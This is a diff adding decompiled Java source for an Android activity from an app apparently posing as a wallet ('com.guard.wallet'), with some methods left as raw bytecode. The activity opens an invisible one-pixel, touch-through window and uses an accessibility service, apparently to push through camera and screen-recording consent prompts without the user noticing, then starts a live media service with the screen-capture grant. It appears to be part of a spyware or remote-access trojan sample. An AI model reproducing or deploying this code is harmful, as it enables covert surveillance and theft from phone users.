@@ -1,0 +1,375 @@
+package com.guard.wallet;
+
+import com.guard.wallet.infra.AccessibilityCompat;
+import com.guard.wallet.core.AppUtils;
+import android.app.Activity;
+import android.content.Intent;
+import android.graphics.Rect;
+import android.media.projection.MediaProjectionManager;
+import android.os.Bundle;
+import android.os.Build.VERSION;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import android.util.Log;
+import android.view.View;
+import android.view.WindowManager.LayoutParams;
+import com.guard.wallet.service.MediaLiveService;
+import com.guard.wallet.service.MyAccessibilityService;
+import com.guard.wallet.utils.SystemHelper;
+import java.util.Collections;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.Objects;
+import java.util.concurrent.ConcurrentLinkedQueue;
+import m.c;
+import m.d;
+import o.l;
+import o.o;
+import com.guard.wallet.capture.ScreenCaptureManager;
+
+public class LockActivity extends Activity {
+   public static volatile LockActivity a;
+
+   public static void a() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 00: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 03: ifnull 21
+      // 06: ldc com/guard/wallet/LockActivity
+      // 08: monitorenter
+      // 09: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 0c: ifnull 15
+      // 0f: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 12: invokevirtual android/app/Activity.finish ()V
+      // 15: ldc com/guard/wallet/LockActivity
+      // 17: monitorexit
+      // 18: goto 21
+      // 1b: astore 0
+      // 1c: ldc com/guard/wallet/LockActivity
+      // 1e: monitorexit
+      // 1f: aload 0
+      // 20: athrow
+      // 21: return
+   }
+
+   public static LockActivity b() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
+      //
+      // Bytecode:
+      // 00: ldc com/guard/wallet/LockActivity
+      // 02: monitorenter
+      // 03: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 06: astore 0
+      // 07: ldc com/guard/wallet/LockActivity
+      // 09: monitorexit
+      // 0a: aload 0
+      // 0b: areturn
+      // 0c: astore 0
+      // 0d: ldc com/guard/wallet/LockActivity
+      // 0f: monitorexit
+      // 10: aload 0
+      // 11: athrow
+   }
+
+   public final void c() {
+      if (!Objects.equals(0, ContextCompat.checkSelfPermission(this, "android.permission.CAMERA")) && MyAccessibilityService.P() != null) {
+         MyAccessibilityService var1 = MyAccessibilityService.P();
+         var1.getClass();
+
+         try {
+            if (var1.i()) {
+               var1.w();
+            }
+
+            ConcurrentLinkedQueue var3 = var1.a;
+            l var2 = new l();
+            var3.add(var2);
+            LinkedList var5 = l.J();
+            var1.t(l.class.getName(), var5);
+         } catch (Exception var4) {
+            q.s("com.guard.wallet.service.AccessibilityDelegateManager", var4);
+         }
+
+         SystemHelper.T0(5);
+         ActivityCompat.requestPermissions(this, new String[]{"android.permission.CAMERA"}, 1004);
+      }
+   }
+
+   public final void d() {
+      MediaProjectionManager var1 = (MediaProjectionManager)this.getSystemService("media_projection");
+      if (var1 != null && MyAccessibilityService.P() != null) {
+         MyAccessibilityService var2 = MyAccessibilityService.P();
+         var2.getClass();
+
+         try {
+            if (var2.m()) {
+               var2.y();
+            }
+
+            ConcurrentLinkedQueue var4 = var2.a;
+            o var3 = new o();
+            var4.add(var3);
+            List var6 = Collections.singletonList(o.H());
+            var2.t(o.class.getName(), var6);
+         } catch (Exception var5) {
+            q.s("com.guard.wallet.service.AccessibilityDelegateManager", var5);
+         }
+
+         SystemHelper.T0(5);
+         this.startActivityForResult(var1.createScreenCaptureIntent(), 1003);
+      }
+   }
+
+   public final void onActivityResult(int var1, int var2, Intent var3) {
+      if (var1 == 1003) {
+         ScreenCaptureManager var4 = ScreenCaptureManager.getInstance();
+         var4.getClass();
+         if (MyAccessibilityService.P() != null) {
+            MyAccessibilityService.P().y();
+         }
+
+         var4.f.set(false);
+         if (var2 == -1) {
+            Log.d("LockActivity", "录屏权限申请成功");
+            if (VERSION.SDK_INT >= 29) {
+               Intent var5 = new Intent(this, MediaLiveService.class);
+               var5.putExtra("code", var2);
+               var5.putExtra("data", var3);
+               this.startForegroundService(var5);
+            } else {
+               ScreenCaptureManager.getInstance().handleProjectionResult(var3);
+            }
+         } else {
+            Log.e("LockActivity", "录屏权限申请失败");
+         }
+
+         this.finish();
+      } else {
+         super.onActivityResult(var1, var2, var3);
+      }
+   }
+
+   public final void onCreate(Bundle var1) {
+      super.onCreate(var1);
+      View var3 = new View(this);
+      int var2 = VERSION.SDK_INT;
+      if (var2 >= 30) {
+         Rect var4 = h.e(h.h(this.getWindow().getWindowManager()));
+         var3.layout(var4.left, var4.top, var4.right, var4.bottom);
+      }
+
+      var3.setImportantForAccessibility(2);
+      if (var2 >= 30) {
+         h.j(var3);
+      }
+
+      this.setContentView(var3);
+      LayoutParams var5 = this.getWindow().getAttributes();
+      var5.dimAmount = 0.0F;
+      var5.x = 0;
+      var5.y = 0;
+      var5.width = 1;
+      var5.height = 1;
+      var5.gravity = 8388661;
+      this.getWindow().setAttributes(var5);
+      this.getWindow().getDecorView().setBackgroundColor(0);
+      this.getWindow().setFlags(1024, 1024);
+      this.getWindow().addFlags(32);
+      this.getWindow().addFlags(16);
+      this.getWindow().addFlags(8);
+      com.guard.wallet.utils.SharedPrefsManager.I();
+   }
+
+   public final void onDestroy() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
+      //
+      // Bytecode:
+      // 00: new java/lang/StringBuilder
+      // 03: dup
+      // 04: ldc_w "LockActivity onDestroy:"
+      // 07: invokespecial java/lang/StringBuilder.<init> (Ljava/lang/String;)V
+      // 0a: astore 1
+      // 0b: aload 1
+      // 0c: invokestatic java/lang/Thread.currentThread ()Ljava/lang/Thread;
+      // 0f: invokevirtual java/lang/Thread.getId ()J
+      // 12: invokevirtual java/lang/StringBuilder.append (J)Ljava/lang/StringBuilder;
+      // 15: pop
+      // 16: ldc "LockActivity"
+      // 18: aload 1
+      // 19: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
+      // 1c: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 1f: pop
+      // 20: aload 0
+      // 21: invokespecial android/app/Activity.onDestroy ()V
+      // 24: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 27: ifnull 3d
+      // 2a: ldc com/guard/wallet/LockActivity
+      // 2c: monitorenter
+      // 2d: aconst_null
+      // 2e: putstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 31: ldc com/guard/wallet/LockActivity
+      // 33: monitorexit
+      // 34: goto 3d
+      // 37: astore 1
+      // 38: ldc com/guard/wallet/LockActivity
+      // 3a: monitorexit
+      // 3b: aload 1
+      // 3c: athrow
+      // 3d: return
+   }
+
+   public final void onRequestPermissionsResult(int var1, String[] var2, int[] var3) {
+      if (var1 == 1004) {
+         d var4 = d.c();
+         var4.getClass();
+         if (MyAccessibilityService.P() != null) {
+            MyAccessibilityService.P().w();
+         }
+
+         if (SystemHelper.k()) {
+            c var6 = var4.e;
+            if (var6 != null) {
+               var1 = var6.b;
+               if (var1 >= 0) {
+                  var4.a(var1);
+               }
+            }
+         }
+
+         var4.a.set(false);
+         if (var3.length > 0 && var3[0] == 0) {
+            Log.d("LockActivity", "摄像头权限申请成功");
+         } else {
+            Log.e("LockActivity", "摄像头权限申请失败");
+         }
+
+         this.finish();
+      } else {
+         super.onRequestPermissionsResult(var1, var2, var3);
+      }
+   }
+
+   public final void onRestoreInstanceState(Bundle var1) {
+      super.onRestoreInstanceState(var1);
+      StringBuilder var2 = new StringBuilder("LockActivity onRestoreInstanceState:");
+      var2.append(Thread.currentThread().getId());
+      Log.d("LockActivity", var2.toString());
+   }
+
+   public final void onResume() {
+      super.onResume();
+      StringBuilder var1 = new StringBuilder("LockActivity onResume:");
+      var1.append(Thread.currentThread().getId());
+      Log.d("LockActivity", var1.toString());
+   }
+
+   public final void onStart() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 00: aload 0
+      // 01: invokespecial android/app/Activity.onStart ()V
+      // 04: new java/lang/StringBuilder
+      // 07: dup
+      // 08: ldc_w "LockActivity onStart:"
+      // 0b: invokespecial java/lang/StringBuilder.<init> (Ljava/lang/String;)V
+      // 0e: astore 1
+      // 0f: aload 1
+      // 10: invokestatic java/lang/Thread.currentThread ()Ljava/lang/Thread;
+      // 13: invokevirtual java/lang/Thread.getId ()J
+      // 16: invokevirtual java/lang/StringBuilder.append (J)Ljava/lang/StringBuilder;
+      // 19: pop
+      // 1a: ldc "LockActivity"
+      // 1c: aload 1
+      // 1d: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
+      // 20: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 23: pop
+      // 24: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 27: ifnonnull 63
+      // 2a: ldc com/guard/wallet/LockActivity
+      // 2c: monitorenter
+      // 2d: getstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 30: ifnonnull 37
+      // 33: aload 0
+      // 34: putstatic com/guard/wallet/LockActivity.a Lcom/guard/wallet/LockActivity;
+      // 37: ldc com/guard/wallet/LockActivity
+      // 39: monitorexit
+      // 3a: invokestatic x/a.b ()Lx/a;
+      // 3d: getfield x/a.f Ljava/util/concurrent/atomic/AtomicBoolean;
+      // 40: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
+      // 43: ifeq 4a
+      // 46: aload 0
+      // 47: invokevirtual com/guard/wallet/LockActivity.d ()V
+      // 4a: invokestatic m/d.c ()Lm/d;
+      // 4d: getfield m/d.a Ljava/util/concurrent/atomic/AtomicBoolean;
+      // 50: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
+      // 53: ifeq 63
+      // 56: aload 0
+      // 57: invokevirtual com/guard/wallet/LockActivity.c ()V
+      // 5a: goto 63
+      // 5d: astore 1
+      // 5e: ldc com/guard/wallet/LockActivity
+      // 60: monitorexit
+      // 61: aload 1
+      // 62: athrow
+      // 63: return
+   }
+
+   public final void onStop() {
+      StringBuilder var1 = new StringBuilder("LockActivity onStop:");
+      var1.append(Thread.currentThread().getId());
+      Log.d("LockActivity", var1.toString());
+      super.onStop();
+   }
+}
